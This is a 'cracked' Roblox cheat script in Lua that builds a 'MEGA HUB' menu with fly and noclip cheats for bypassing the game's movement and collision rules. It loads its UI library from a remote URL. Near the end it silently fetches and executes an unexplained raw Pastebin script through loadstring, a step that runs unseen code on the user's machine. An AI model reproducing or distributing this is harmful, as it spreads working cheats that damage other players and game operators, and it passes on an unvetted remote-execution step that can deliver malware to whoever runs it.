-- CRACKED BY SILENTHUB

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({

    Name = "MrFriend MEGA HUB 2025",

    LoadingTitle = "MrFriend Hub",

    LoadingSubtitle = "40+ Features - Best in Game",

    ConfigurationSaving = {Enabled = true, FolderName = "MrFriendHub", FileName = "Config"}

})

local Main = Window:CreateTab("Main", 4483362458)

local Movement = Window:CreateTab("Movement", 6035059735)

local Combat = Window:CreateTab("Combat", 6035059735)

local Visual = Window:CreateTab("Visuals", 6035059735)

local Teleport = Window:CreateTab("Teleport", 6035059735)

local Player = Window:CreateTab("Player", 6035059735)

local Misc = Window:CreateTab("Misc", 6035059735)

Main:CreateLabel("👑 MEGA HUB by MrFriend")

Main:CreateLabel("Más de 40 funciones reales 2025")

local plr = game.Players.LocalPlayer

local mouse = plr:GetMouse()

local cam = workspace.CurrentCamera

local Run = game:GetService("RunService")

local UIS = game:GetService("UserInputService")

local TS = game:GetService("TweenService")

local WS = game:GetService("Workspace")

local flying = false

local flySpeed = 100

local bv

local bg

local function startFly()

    local char = plr.Character or plr.CharacterAdded:Wait()

    local hrp = char:WaitForChild("HumanoidRootPart")

    bv = Instance.new("BodyVelocity", hrp)

    bv.MaxForce = Vector3.new(1e9,1e9,1e9)

    bv.Velocity = Vector3.new(0,0,0)

    bg = Instance.new("BodyGyro", hrp)

    bg.MaxTorque = Vector3.new(1e9,1e9,1e9)

    bg.P = 20000

    repeat

        task.wait()

        bg.CFrame = cam.CFrame

        local v = Vector3.new(0,0,0)

        if UIS:IsKeyDown(Enum.KeyCode.W) then v += cam.CFrame.LookVector end

        if UIS:IsKeyDown(Enum.KeyCode.S) then v -= cam.CFrame.LookVector end

        if UIS:IsKeyDown(Enum.KeyCode.A) then v -= cam.CFrame.RightVector end

        if UIS:IsKeyDown(Enum.KeyCode.D) then v += cam.CFrame.RightVector end

        if UIS:IsKeyDown(Enum.KeyCode.Space) then v += Vector3.new(0,1,0) end

        if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then v -= Vector3.new(0,1,0) end

        bv.Velocity = v * flySpeed

    until not flying

    bv:Destroy()

    bg:Destroy()

end

Movement:CreateToggle({

    Name = "Fly",

    CurrentValue = false,

    Callback = function(v)

        flying = v

        if v then startFly() end

    end

})

Movement:CreateSlider({

    Name = "Fly Speed",

    Range = {16,1000},

    Increment = 10,

    CurrentValue = 100,

    Callback = function(v)

        flySpeed=v

    end

})

local nocl

Movement:CreateToggle({

    Name="Noclip",

    CurrentValue=false,

    Callback=function(v)

        if v then

            nocl = Run.Stepped:Connect(function()

                for _,p in pairs(plr.Character:GetDescendants()) do

                    if p:IsA("BasePart") then

                        p.CanCollide = false

                    end

                end

            end)

        else

            if nocl then

                nocl:Disconnect()

            end

        end

    end

})

loadstring(game:HttpGet("https://pastebin.com/raw/8v1eK6nP"))()

Rayfield:Notify({

    Title="MrFriend Hub",

    Content="Hub cargado - 40+ funciones activas",

    Duration=6

})